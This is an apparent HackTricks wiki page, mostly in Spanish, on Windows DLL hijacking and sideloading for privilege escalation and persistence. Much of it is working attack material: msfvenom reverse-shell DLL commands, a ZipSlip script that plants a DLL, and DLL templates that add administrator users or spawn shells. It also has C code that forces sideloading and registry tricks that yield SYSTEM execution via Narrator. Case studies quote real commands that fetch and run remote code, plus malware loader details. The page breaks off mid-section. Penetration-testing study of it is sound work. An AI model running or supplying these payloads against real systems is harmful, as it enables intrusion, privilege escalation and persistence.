# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Información Básica

DLL Hijacking consiste en manipular una aplicación confiable para que cargue una DLL maliciosa. Este término abarca varias tácticas como **DLL Spoofing, Injection, and Side-Loading**. Se utiliza principalmente para la ejecución de código, lograr persistencia y, con menos frecuencia, la escalada de privilegios. A pesar de que aquí el foco está en la escalada, el método de hijacking sigue siendo el mismo para distintos objetivos.

### Técnicas Comunes

Se emplean varios métodos para DLL hijacking, y su efectividad depende de la estrategia de carga de DLLs de la aplicación:

1. **DLL Replacement**: Reemplazar una DLL legítima por una maliciosa, opcionalmente usando DLL Proxying para preservar la funcionalidad de la DLL original.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda que preceda a la legítima, explotando el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa para que una aplicación la cargue, pensando que es una DLL requerida inexistente.
4. **DLL Redirection**: Modificar parámetros de búsqueda como `%PATH%` o los archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación a la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una maliciosa en el directorio WinSxS, un método a menudo asociado con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto con la aplicación copiada, pareciendo la técnica Binary Proxy Execution.

> [!TIP]
> Para una cadena paso a paso que encadene HTML staging, AES-CTR configs y .NET implants sobre DLL sideloading, revisa el flujo de trabajo abajo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Encontrar Dlls faltantes

La forma más común de encontrar Dlls faltantes en un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

y mostrar solo la **File System Activity**:

![](<../../../images/image (153).png>)

Si buscas **dlls faltantes en general** debes dejar esto ejecutándose durante algunos **segundos**.\
Si buscas una **dll faltante dentro de un ejecutable específico** deberías configurar **otro filtro como "Process Name" "contains" `<exec name>`, ejecutarlo y detener la captura de eventos**.

## Explotando Dlls faltantes

Para escalar privilegios, la mejor oportunidad es poder **escribir una dll que un proceso privilegiado intentará cargar** en alguno de los **lugares donde se va a buscar**. Así, podremos **escribir** una dll en una **carpeta** donde la **dll se busca antes** que la carpeta donde está la **dll original** (caso extraño), o podremos **escribir en alguna carpeta donde se vaya a buscar la dll** y la **dll original no exista** en ninguna carpeta.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Las aplicaciones de Windows buscan DLLs siguiendo un conjunto de rutas de búsqueda predefinidas, respetando una secuencia particular. El problema del DLL hijacking surge cuando una DLL maliciosa se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que la DLL auténtica. Una solución para evitar esto es asegurar que la aplicación use rutas absolutas al referirse a las DLLs que necesita.

You can see the **DLL search order on 32-bit** systems below:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

That is the **default** search order with **SafeDllSearchMode** enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value and set it to 0 (default is enabled).

If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD_WITH_ALTERED_SEARCH_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.

Finally, note that **a dll could be loaded indicating the absolute path instead just the name**. In that case that dll is **only going to be searched in that path** (if the dll has any dependencies, they are going to be searched as just loaded by name).

There are other ways to alter the ways to alter the search order but I'm not going to explain them here.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
2. If the binary runs on a schedule or as a service, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a ZipSlip-style arbitrary write, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Entrega el archivo al buzón/compartido monitorizado; cuando la tarea programada vuelva a lanzar el proceso, este cargará el DLL malicioso y ejecutará tu código con la cuenta de servicio.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Una manera avanzada de influir de forma determinista en la ruta de búsqueda de DLL de un proceso recién creado es establecer el campo DllPath en RTL_USER_PROCESS_PARAMETERS al crear el proceso con las APIs nativas de ntdll. Al proporcionar aquí un directorio controlado por el atacante, un proceso objetivo que resuelva una DLL importada por nombre (sin ruta absoluta y sin usar los flags de carga segura) puede verse forzado a cargar una DLL maliciosa desde ese directorio.

Idea clave
- Construye los parámetros del proceso con RtlCreateProcessParametersEx y proporciona un DllPath personalizado que apunte a tu carpeta controlada (p. ej., el directorio donde reside tu dropper/unpacker).
- Crea el proceso con RtlCreateUserProcess. Cuando el binario objetivo resuelva una DLL por nombre, el loader consultará este DllPath suministrado durante la resolución, permitiendo un sideloading fiable incluso cuando la DLL maliciosa no esté colocada junto al EXE objetivo.

Notas/limitaciones
- Esto afecta al proceso hijo que se está creando; es diferente de SetDllDirectory, que afecta solo al proceso actual.
- El objetivo debe importar o llamar a LoadLibrary para una DLL por nombre (sin ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs y rutas absolutas codificadas no pueden ser secuestradas. Forwarded exports y SxS pueden cambiar la precedencia.

Ejemplo mínimo en C (ntdll, wide strings, manejo de errores simplificado):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **comprueba los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes comprobar los imports de un ejecutable y los exports de una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para una guía completa sobre cómo **abusar de Dll Hijacking para escalar privilegios** con permisos para escribir en una **carpeta del PATH del sistema** consulta:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Herramientas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) comprobará si tienes permisos de escritura en cualquier carpeta dentro del PATH del sistema.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll._

### Ejemplo

Si encuentras un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. De todos modos, ten en cuenta que Dll Hijacking resulta útil para [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o desde[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear una dll válida** dentro de este estudio sobre dll hijacking enfocado en la ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente sección** puedes encontrar algunos **códigos dll básicos** que podrían ser útiles como **plantillas** o para crear una **dll con funciones no requeridas exportadas**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Básicamente un **Dll proxy** es una Dll capaz de **ejecutar tu código malicioso cuando se carga** pero también de **exponerse** y **funcionar** como **se espera** reenviando todas las llamadas a la biblioteca real.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes realmente **indicar un ejecutable y seleccionar la librería** que quieres proxificar y **generar una dll proxificada** o **indicar la Dll** y **generar una dll proxificada**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86 no vi una versión x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propio

Ten en cuenta que en varios casos la Dll que compiles debe **exportar varias funciones** que van a ser cargadas por el proceso de la víctima; si estas funciones no existen el **binary no podrá cargarlas** y el **exploit fallará**.

<details>
<summary>Plantilla DLL en C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Ejemplo de DLL en C++ con creación de usuario</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL en C alternativa con entrada de hilo</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudio de caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe todavía busca una DLL de localización predecible y específica por idioma al arrancar que puede ser hijacked para ejecución de código arbitrario y persistencia.

Hechos clave
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Descubrimiento con Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silencio OPSEC
- Un hijack ingenuo generará voz/realzará la UI. Para mantenerse silencioso, al adjuntar enumera los hilos de Narrator, abre el hilo principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y `SuspendThread` en ese hilo; continúa en tu propio hilo. Ver PoC para el código completo.

Trigger and persistence via Accessibility configuration
- Contexto de usuario (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con lo anterior, al iniciar Narrator se carga la DLL plantada. En el secure desktop (pantalla de inicio de sesión), presiona CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Permitir la capa de seguridad clásica de RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conéctate por RDP al host; en la pantalla de inicio de sesión presiona CTRL+WIN+ENTER para lanzar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.
- La ejecución se detiene cuando la sesión RDP cierra — inyecta/migra con rapidez.

Bring Your Own Accessibility (BYOA)
- Puedes clonar una entrada de registro de Accessibility Tool (AT) integrada (p. ej., CursorIndicator), editarla para que apunte a un binario/DLL arbitrario, importarla y luego establecer `configuration` a ese nombre de AT. Esto proxia la ejecución arbitraria bajo el framework de Accessibility.

Notas
- Escribir en `%windir%\System32` y cambiar valores HKLM requiere privilegios de administrador.
- Toda la lógica del payload puede vivir en `DLL_PROCESS_ATTACH`; no se necesitan exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Este caso demuestra **Phantom DLL Hijacking** en el TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), registrado como **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` ubicado en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta diariamente a las 9:30 AM en el contexto del usuario conectado.
- **Directory Permissions**: Escribible por `CREATOR OWNER`, permitiendo a usuarios locales dejar archivos arbitrarios.
- **DLL Search Behavior**: Intenta cargar `hostfxr.dll` desde su directorio de trabajo primero y registra "NAME NOT FOUND" si falta, indicando que la búsqueda prioriza el directorio local.

### Exploit Implementation

Un atacante puede colocar un stub malicioso `hostfxr.dll` en el mismo directorio, explotando la DLL faltante para lograr ejecución de código bajo el contexto del usuario:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flujo de ataque

1. Como usuario estándar, coloca `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Espera a que la tarea programada se ejecute a las 9:30 AM en el contexto del usuario actual.
3. Si un administrador ha iniciado sesión cuando se ejecuta la tarea, la DLL maliciosa se ejecuta en la sesión del administrador con integridad medium.
4. Encadena técnicas estándar de UAC bypass para elevarse desde medium integrity a privilegios SYSTEM.

## Estudio de caso: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Los actores de amenaza a menudo emparejan droppers basados en MSI con DLL side-loading para ejecutar payloads bajo un proceso firmado y de confianza.

Chain overview
- El usuario descarga el MSI. Una CustomAction se ejecuta silenciosamente durante la instalación GUI (p. ej., LaunchApplication o una acción VBScript), reconstruyendo la siguiente etapa a partir de recursos incrustados.
- El dropper escribe un EXE legítimo firmado y una DLL maliciosa en el mismo directorio (ejemplo de par: wsc_proxy.exe firmado por Avast + wsc.dll controlada por el atacante).
- Cuando se inicia el EXE firmado, el orden de búsqueda de DLLs de Windows carga wsc.dll desde el directorio de trabajo primero, ejecutando código del atacante bajo un padre firmado (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Busca entradas que ejecuten ejecutables o VBScript. Patrón sospechoso de ejemplo: LaunchApplication ejecutando un archivo incrustado en segundo plano.
- En Orca (Microsoft Orca.exe), inspecciona las tablas CustomAction, InstallExecuteSequence y Binary.
- Payloads incrustados/divididos en el CAB del MSI:
- Extracción administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- O usar lessmsi: lessmsi x package.msi C:\out
- Busca múltiples fragmentos pequeños que se concatenan y descifran mediante una VBScript CustomAction. Flujo común:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading práctico con wsc_proxy.exe
- Coloca estos dos archivos en la misma carpeta:
- wsc_proxy.exe: host legítimo firmado (Avast). El proceso intenta cargar wsc.dll por nombre desde su directorio.
- wsc.dll: DLL del atacante. Si no se requieren exports específicos, DllMain puede ser suficiente; de lo contrario, construye un proxy DLL y reenvía los exports requeridos a la librería genuina mientras ejecutas el payload en DllMain.
- Construye un payload DLL mínimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para los requisitos de exportación, usa un framework de proxy (p. ej., DLLirant/Spartacus) para generar un DLL de reenvío que también ejecute tu payload.

- Esta técnica depende de la resolución del nombre de DLL por el binario host. Si el host usa rutas absolutas o banderas de carga segura (p. ej., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijack puede fallar.
- KnownDLLs, SxS, y forwarded exports pueden influir en la precedencia y deben considerarse al elegir el binario host y el conjunto de exports.

## Triadas firmadas + payloads cifrados (estudio de caso ShadowPad)

Check Point describió cómo Ink Dragon despliega ShadowPad usando una **tríada de tres archivos** para mezclarse con software legítimo mientras mantiene el payload principal cifrado en disco:

1. **Signed host EXE** – se abusan proveedores como AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Los atacantes renombran el ejecutable para que parezca un binario de Windows (por ejemplo `conhost.exe`), pero la firma Authenticode sigue siendo válida.
2. **Malicious loader DLL** – colocado junto al EXE con un nombre esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). El DLL suele ser un binario MFC ofuscado con el framework ScatterBrain; su única tarea es localizar el blob cifrado, descifrarlo y mapear reflectivamente ShadowPad.
3. **Encrypted payload blob** – a menudo almacenado como `<name>.tmp` en el mismo directorio. Tras mapear en memoria el payload descifrado, el loader elimina el archivo TMP para destruir evidencia forense.

Tradecraft notes:

* Renombrar el EXE firmado (manteniendo el `OriginalFileName` en el header PE) le permite hacerse pasar por un binario de Windows pero conservar la firma del proveedor, así que replica la costumbre de Ink Dragon de dejar binarios con apariencia `conhost.exe` que en realidad son utilidades de AMD/NVIDIA.
* Dado que el ejecutable sigue siendo confiable, la mayoría de los controles de allowlisting solo requieren que tu DLL maliciosa esté junto a él. Concéntrate en personalizar el loader DLL; el padre firmado normalmente puede ejecutarse sin modificaciones.
* El decryptor de ShadowPad espera que el blob TMP esté junto al loader y sea escribible para poder poner a cero el archivo después del mapeo. Mantén el directorio escribible hasta que el payload se cargue; una vez en memoria, el archivo TMP puede eliminarse de forma segura por OPSEC.

### LOLBAS stager + cadena de sideloading con archivo escalonado (finger → tar/curl → WMI)

Los operadores combinan DLL sideloading con LOLBAS de modo que el único artefacto personalizado en disco sea el DLL malicioso junto al EXE confiable:

- **Remote command loader (Finger):** PowerShell oculto lanza `cmd.exe /c`, obtiene comandos de un servidor Finger y los canaliza a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` obtiene texto por TCP/79; `| cmd` ejecuta la respuesta del servidor, permitiendo a los operadores rotar la segunda etapa desde el servidor.

- **Built-in download/extract:** Descarga un archivo con una extensión benign, descomprímelo y coloca el objetivo de sideload y el DLL bajo una carpeta aleatoria en `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta el progreso y sigue redirecciones; `tar -xf` usa el tar integrado de Windows.

- **WMI/CIM launch:** Inicia el EXE vía WMI para que la telemetría muestre un proceso creado por CIM mientras carga el DLL colocalizado:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona con binarios que prefieren DLL locales (p. ej., `intelbq.exe`, `nearby_share.exe`); el payload (p. ej., Remcos) se ejecuta bajo el nombre confiable.

- **Hunting:** Genera alerta en `forfiles` cuando `/p`, `/m` y `/c` aparecen juntos; poco común fuera de scripts administrativos.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una intrusión reciente de Lotus Blossom abusó de una cadena de actualización confiable para entregar un dropper empaquetado con NSIS que colocó un sideload de DLL y payloads completamente en memoria.

Tradecraft flow
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca **HIDDEN**, deja un Bitdefender Submission Wizard renombrado `BluetoothService.exe`, un `log.dll` malicioso y un blob cifrado `BluetoothService`, y luego lanza el EXE.
- El EXE host importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` mapea el blob en memoria; `LogWrite` lo descifra con un stream personalizado basado en LCG (constantes **0x19660D** / **0x3C6EF35F**, material de clave derivado de un hash previo), sobrescribe el buffer con shellcode en claro, libera temporales y salta a él.
- Para evitar una IAT, el loader resuelve APIs hasheando nombres de exports usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, aplicando luego una avalancha estilo Murmur (**0x85EBCA6B**) y comparando contra hashes objetivo salados.

Main shellcode (Chrysalis)
- Descifra un módulo principal tipo PE repitiendo add/XOR/sub con la clave `gQ2JR&9;` durante cinco pasadas, luego carga dinámicamente `Kernel32.dll` → `GetProcAddress` para terminar la resolución de imports.
- Reconstruye cadenas de nombres de DLL en tiempo de ejecución mediante transformaciones por carácter de bit-rotate/XOR, luego carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un segundo resolver que recorre el **PEB → InMemoryOrderModuleList**, parsea cada tabla de exports en bloques de 4 bytes con mezcla estilo Murmur, y solo recurre a `GetProcAddress` si no encuentra el hash.

Embedded configuration & C2
- La configuración vive dentro del archivo `BluetoothService` dejado en **offset 0x30808** (tamaño **0x980**) y está descifrada con RC4 usando la clave `qwhvb^435h&*7`, revelando la URL de C2 y el User-Agent.
- Los beacons construyen un perfil del host delimitado por puntos, anteponen la etiqueta `4Q`, luego lo encriptan con RC4 usando la clave `vAuig34%^325hGV` antes de `HttpSendRequestA` sobre HTTPS. Las respuestas se descifran con RC4 y se despachan por un switch de etiquetas (`4T` shell, `4V` ejecución de proceso, `4W/4X` escritura de archivo, `4Y` lectura/exfil, `4\\` desinstalar, `4` enumeración de unidades/archivos + casos de transferencia en fragmentos).
- El modo de ejecución está condicionado por args de CLI: sin args = instala persistencia (servicio/clave Run) apuntando a `-i`; `-i` relanza a sí mismo con `-k`; `-k` salta la instalación y ejecuta el payload.

Alternate loader observed
